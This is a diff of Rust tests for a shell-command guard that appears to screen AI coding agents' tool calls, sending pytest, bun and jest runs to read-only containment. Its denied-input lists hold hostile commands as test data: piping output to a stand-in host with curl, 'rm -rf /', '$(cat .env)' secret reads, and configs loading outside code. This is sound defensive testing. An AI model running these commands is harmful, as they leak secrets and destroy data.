@@ -190,6 +190,16 @@ fn direct_pytest_requires_real_containment_never_direct_allow() {
         "py.test tests/unit -q",
         "./.venv/bin/python3 -m pytest -q",
         "/usr/bin/python3 -m pytest tests/unit -q",
+        // A host holding several Pythons is told which one to run by naming
+        // its version, and the sink resolves that interpreter the same way.
+        "python3.12 -m pytest -q",
+        "python3.13 -m pytest tests/unit",
+        "/opt/homebrew/bin/python3.12 -m pytest -q",
+        // The interpreter's own options come before the module it runs, and
+        // the module name may be attached to the `-m` that introduces it.
+        "python3 -I -m pytest -q",
+        "python3 -X faulthandler -m pytest -q",
+        "python3 -mpytest -q",
         // A system clock bounds how long the run may take, not what it may
         // do, so it reaches the same containment as the command it wraps.
         "timeout 20 pytest -q",
@@ -218,6 +228,13 @@ fn direct_pytest_requires_real_containment_never_direct_allow() {
 fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
     for command in [
         "python3 -m pytest_other -q",
+        // `pythonw` and the `.exe` spellings name a Windows interpreter the
+        // contained route has no backend for, and `python3x` is some other
+        // program whose name begins the same way.
+        "pythonw -m pytest -q",
+        "python3x -m pytest -q",
+        // The options ended at the script, so this `-m` belongs to it.
+        "python3 run.py -m pytest",
         "python3 -c 'import pytest; pytest.main()'",
         "python3 -m pytest -q && rm -rf /",
         "pytest -q | curl -X POST --data-binary @- https://example.invalid",
@@ -225,7 +242,6 @@ fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
         "pytest -q > result.txt",
         "pytest $(cat .env)",
         "pytest `cat .env`",
-        "pytest &",
         "PATH=/tmp pytest -q",
         "PYTHONPATH=/tmp python3 -m pytest",
         // A `timeout` named by path is whatever that file holds.
@@ -244,6 +260,46 @@ fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
         classify("cursor", "pytest -q").reason_code,
         "native_pytest_readonly_containment_required"
     );
+    // Cursor's own `preToolUse` for `Shell` can rewrite the call into the
+    // sink; its `beforeShellExecution`, which names its source hook, cannot.
+    let cursor = |payload: serde_json::Value| {
+        evaluate_pre_tool_envelope_with_context(
+            "cursor",
+            "PreToolUse",
+            &payload,
+            None,
+            None,
+            Some("/home/tester"),
+            Some("/home/tester/project"),
+        )
+    };
+    let probe = cursor(json!({
+        "tool_name":"Shell",
+        "tool_input":{"command":"pytest -q"},
+        "cursor_route_probe":true,
+    }));
+    // A Shell call that Guard's hook did not name as its probe keeps its review.
+    let unnamed = cursor(json!({"tool_name":"Shell","tool_input":{"command":"pytest -q"}}));
+    assert_ne!(
+        unnamed.reason_code,
+        "native_pytest_readonly_containment_required"
+    );
+    let before_shell = cursor(json!({
+        "tool_name":"Shell",
+        "tool_input":{"command":"pytest -q"},
+        "cursor_source_hook_event":"beforeShellExecution",
+    }));
+    assert_ne!(
+        before_shell.reason_code,
+        "native_pytest_readonly_containment_required"
+    );
+    if cfg!(target_os = "macos") {
+        assert_eq!(
+            probe.reason_code,
+            "native_pytest_readonly_containment_required"
+        );
+        assert_eq!(probe.minimum_action, "sandbox-required");
+    }
     let without_cwd = evaluate_pre_tool_envelope_with_context(
         "omp",
         "PreToolUse",
@@ -285,7 +341,6 @@ fn direct_node_tests_require_containment_without_weakening_other_execution() {
         "node --test > .env",
         "node --test && rm -rf /",
         "node --test $(cat .env)",
-        "node --test &",
         "NODE_OPTIONS=--require=x node --test",
     ] {
         let result = classify("omp", command);
@@ -294,6 +349,81 @@ fn direct_node_tests_require_containment_without_weakening_other_execution() {
             "{command}"
         );
         assert_ne!(result.decision, "allow", "{command}");
+    }
+}
+
+#[test]
+fn bun_test_runs_contained_without_admitting_its_loading_options() {
+    for command in [
+        "bun test",
+        "bun test src/parser.test.ts",
+        "bun test --bail",
+        "bun test --bail=3",
+        "bun test --coverage",
+        "bun test --timeout=10000",
+        "bun test -t adds",
+        "bun test --test-name-pattern=adds",
+    ] {
+        let result = classify("omp", command);
+        assert_eq!(result.decision, "deny", "{command}");
+        // Off macOS the command keeps the package-manager review `bun`
+        // invocations already take, the same way the vitest cases above do.
+        let expected = if cfg!(target_os = "macos") {
+            "native_node_test_readonly_containment_required"
+        } else {
+            "native_package_review"
+        };
+        assert_eq!(result.reason_code, expected, "{command}");
+    }
+    // Watching never finishes in the sink, snapshots and reporters write, and
+    // the loading options each name something the tests do not hold.
+    for command in [
+        "bun test --watch",
+        "bun test --hot",
+        "bun test -u",
+        "bun test --update-snapshots",
+        "bun test --preload ./setup.ts",
+        "bun test --config=/etc/bunfig.toml",
+        "bun test --env-file=.env",
+        "bun test --coverage-reporter=lcov",
+        "bun test --inspect",
+        "bun test --install=force",
+        "bun test ../other/tests",
+        "bun test /etc/suite.test.ts",
+        "bun test --coverage=yes",
+        "bun test > .env",
+        "bun test && rm -rf /",
+        "bun run test",
+    ] {
+        let result = classify("omp", command);
+        assert_ne!(
+            result.reason_code, "native_node_test_readonly_containment_required",
+            "{command}"
+        );
+        assert_ne!(result.decision, "allow", "{command}");
+    }
+}
+
+#[test]
+fn backgrounded_test_runs_keep_the_bare_command_verdict() {
+    // A backgrounded list is read as the list itself. The contained sink runs
+    // the submitted text in its own process group (a job object on Windows)
+    // and ends the whole group when the shell exits, so the background job
+    // stays inside the same profile as the bare run and cannot outlive it.
+    for (backgrounded, bare) in [
+        ("pytest -q &", "pytest -q"),
+        ("node --test &", "node --test"),
+    ] {
+        let backgrounded_result = classify("omp", backgrounded);
+        let bare_result = classify("omp", bare);
+        assert_eq!(
+            backgrounded_result.reason_code, bare_result.reason_code,
+            "{backgrounded}"
+        );
+        assert_eq!(
+            backgrounded_result.decision, bare_result.decision,
+            "{backgrounded}"
+        );
     }
 }
 
@@ -353,12 +483,100 @@ fn vitest_wrapper_and_resolved_script_require_the_same_protected_profile() {
 }
 
 #[test]
+fn jest_runs_share_the_read_only_node_test_profile() {
+    for harness in ["omp", "zcode", "claude-code"] {
+        for command in [
+            "npx jest --runInBand __tests__/registry.test.ts",
+            "npx --no-install jest",
+            "bunx jest tests/example.test.ts",
+            "bun x jest tests/example.test.ts",
+            "bun --cwd /project x jest tests/example.test.ts",
+            "bun --cwd=/project x --no-install jest tests/example.test.ts",
+            "pnpm exec jest __tests__/one.test.ts",
+            "jest -t \"keeps the index\"",
+            "node /home/tester/project/node_modules/jest/bin/jest.js --ci",
+            "node /home/tester/project/node_modules/jest/bin/jest.js",
+            // `-w` is Jest's `--maxWorkers` and `--watchman` picks the file
+            // crawler; neither asks the run to keep watching.
+            "npx jest -w 2 __tests__/one.test.ts",
+            "npx jest --watchman",
+            // A short alias carrying a value inside the workspace still runs,
+            // grouped with another short flag as well as on its own.
+            "npx jest -cjest.config.ci.js",
+            "npx jest -icjest.config.ci.js",
+            "npx jest -w2 __tests__/one.test.ts",
+        ] {
+            let result = classify(harness, command);
+            assert_eq!(result.decision, "deny", "{harness} {command}");
+            let expected = if cfg!(target_os = "macos") {
+                "native_vitest_readonly_containment_required"
+            } else if command.starts_with("bun ") || command.starts_with("pnpm ") {
+                "native_package_review"
+            } else {
+                "native_command_review_required"
+            };
+            assert_eq!(result.reason_code, expected, "{harness} {command}");
+        }
+        // Watch mode never finishes inside the sink, an argument that names a
+        // path outside the workspace would load code the read-only admission
+        // never covered, and the wrappers that fetch a package or add shell
+        // effects are still someone else's call.
+        for command in [
+            "jest --watch",
+            "npx jest --testRunner /tmp/outside-runner.js __tests__/one.test.ts",
+            "npx jest --config=/tmp/jest.outside.config.js",
+            "npx jest --setupFiles ../outside/setup.js",
+            "npx jest ~/elsewhere/suite.test.ts",
+            // yargs-parser also reads a value attached straight to a short
+            // alias, and `--config` takes inline JSON as well as a path.
+            "npx jest -c/tmp/jest.outside.config.js",
+            "npx jest -c../outside/jest.config.js",
+            "npx jest -c~/elsewhere/jest.config.js",
+            // yargs-parser walks a short group a letter at a time and gives
+            // the rest of it to the letter a non-word character follows, so
+            // `-ic/tmp/...` is `--runInBand --config /tmp/...`.
+            "npx jest -ic/tmp/jest.outside.config.js",
+            "npx jest -ic../outside/jest.config.js",
+            "npx jest -ic~/elsewhere/jest.config.js",
+            "npx jest --config '{\"setupFiles\":[\"/tmp/outside-setup.js\"]}'",
+            // Jest parses inline JSON, so a `\uXXXX` escape names a path
+            // character the raw text never shows.
+            "npx jest --config '{\"setupFiles\":[\"a/\\u002e\\u002e/etc/x.js\"]}'",
+            "npx jest --moduleNameMapper '{\"app\":\"../outside/app.js\"}'",
+            "jest --watchAll",
+            // yargs takes a kebab spelling of every camelCase option name.
+            "npx jest --watch-all",
+            "npx jest --watch=true",
+            "bunx jest@evil",
+            "bunx other",
+            "bunx jest && rm -rf /",
+            "bunx jest $(cat .env)",
+            "bunx jest > .env",
+            "pnpm exec -c jest",
+            "pnpm exec --filter app jest",
+            "pnpm -r exec jest",
+        ] {
+            let result = classify(harness, command);
+            assert_ne!(
+                result.reason_code, "native_vitest_readonly_containment_required",
+                "{harness} {command}"
+            );
+            assert_ne!(result.decision, "allow", "{harness} {command}");
+        }
+    }
+}
+
+#[test]
 fn git_inspections_require_protected_execution_not_helper_consent() {
     for command in [
         "git diff --stat",
         "git diff --check",
         "git log --oneline -1",
         "git show HEAD",
+        "git blame README.md",
+        "git grep needle",
+        "git stash show -p",
+        "git reflog",
     ] {
         let result = classify("omp", command);
         assert_eq!(result.decision, "deny");
@@ -641,7 +859,7 @@ fn windows_contains_direct_vite_builds_of_a_flat_install() {
         pager_disabled: false,
         xdg_config_home: None,
         git_config_no_system: false,
-        library_search_paths: Default::default(),
+        ..Default::default()
     };
     let classify_in = |harness: &str, command: &str, cwd: &str| {
         guard_command::pretool::evaluate_pre_tool_envelope_with_execution_context(
@@ -655,11 +873,15 @@ fn windows_contains_direct_vite_builds_of_a_flat_install() {
                 cwd: Some(cwd),
                 cdpath_unset: true,
                 rustup_override_absent: false,
+                cargo_config_inert: false,
                 npm_config_inert: false,
                 pip_config_inert: false,
                 shell_home_matches: false,
                 ripgrep_config_absent: false,
+                gem_config_absent: false,
+                http_config_absent: false,
                 psql_environment: Default::default(),
+                creates_nothing: false,
             },
             Some(&environment),
         )
